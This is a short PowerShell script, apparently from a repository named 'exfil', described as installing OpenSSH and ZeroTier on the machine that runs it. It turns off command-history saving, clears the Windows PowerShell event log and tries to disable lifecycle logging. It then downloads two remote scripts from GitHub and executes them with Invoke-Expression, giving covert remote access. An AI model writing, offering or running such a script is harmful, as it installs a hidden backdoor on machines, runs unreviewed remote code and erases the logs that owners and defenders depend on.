<# This script will install openssh and zerotier on a machince once called. #>
$AvailableTls = [enum]::GetValues('Net.SecurityProtocolType') | Where-Object { $_ -ge 'Tls12' }
foreach ($tlsProtocol in $AvailableTls) {[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor $tlsProtocol}
Set-PSReadLineOption -HistorySaveStyle SaveNothing | Out-Null
Clear-EventLog "Windows Powershell"
$LogEngineLifecycleEvent = $false | Out-Null
[void]$LogEngineLifecycleEvent
$url1 = "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/ZeroTierStuff/ZTInstall.ps1"
$url2 = "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/OpenSSHStuff/OpenSSHInstallFromExe.ps1"
Invoke-Expression (Invoke-WebRequest -Uri $url1 -UseBasicParsing).Content
Invoke-Expression (Invoke-WebRequest -Uri $url2 -UseBasicParsing).Content